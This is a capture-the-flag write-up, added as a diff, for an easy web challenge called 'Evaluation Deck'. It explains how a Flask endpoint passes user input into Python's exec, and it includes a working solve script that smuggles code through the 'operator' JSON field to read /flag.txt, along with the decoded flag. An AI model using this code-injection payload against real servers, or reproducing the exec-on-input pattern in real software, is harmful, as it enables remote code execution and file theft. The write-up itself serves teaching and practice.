@@ -1,0 +1,65 @@
+# Evaluation Deck
+
+Category: Web
+Difficulty: Easy
+
+## Description
+
+A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?
+
+## Solve
+
+Since we are given the source code, I didn't spend much time on the actual website, and dove right into the code. Its written in Flask, a python framework.
+I know from other challenges that I immediately want to look at all the places the web application routes to. Within the code we can traverse
+
+web_evaluation_deck
+  | challenge
+    | application
+      | routes.py
+      
+### Vulnerability
+
+Routes.py is the place in which Flask applications define how to route between pages. Here, one may find that in addition to the index, root page of the website, there is also an API with a single POST endpoint used to run the game at index.html (the root page), which should have some kind authentication on it, but does not.
+
+`@api.route('/get_health', methods=['POST'])`
+
+This endpoint does something interesting. You, as the user, pass three Json arguments; current_health, attack_power and operator. These are inputted as variables into a string which is passed into Python's exec function, which will attempt to "compile" into python code, and return the result. 
+
+```
+code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
+        exec(code, result)
+        return response(result.get('result'))
+```
+
+Thus, we have been given an opportunity to run code on the server, as long as we can coerce it to fit the mold of `{int(current_health)} {operator} {int(attack_power)}`, and we can run such code to get the flag, found at /flag.txt on the server.
+
+### Solve Script
+
+```
+import requests
+
+json = {"current_health" : 1, "attack_power" : 50, "operator" : """+ int.from_bytes(str.encode(open("/flag.txt", "r").read()), "big") #" """}
+
+r = requests.post("http://10.10.11.180:9093/", json=json)
+
+print(r.text)
+```
+
+r.text prints a string, which is the integer representation of the flag, with 1 (decimal) added to it. We need to reverse this process in order to read the 
+flag as Ascii. 
+
+```bash
+[alex@alex-manjaro HackTheBoo]$ python3 post.py 
+{"message":32715399093214716429448760121842372818350028882199757926917881424671737454974}
+
+[alex@alex-manjaro HackTheBoo]$ python 
+Python 3.10.7 (main, Sep  6 2022, 21:22:27) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> a = 32715399093214716429448760121842372818350028882199757926917881424671737454974 - 1
+>>> a.to_bytes(32, "big")
+b'HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}'
+```
+
+## Flag
+
+b'HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
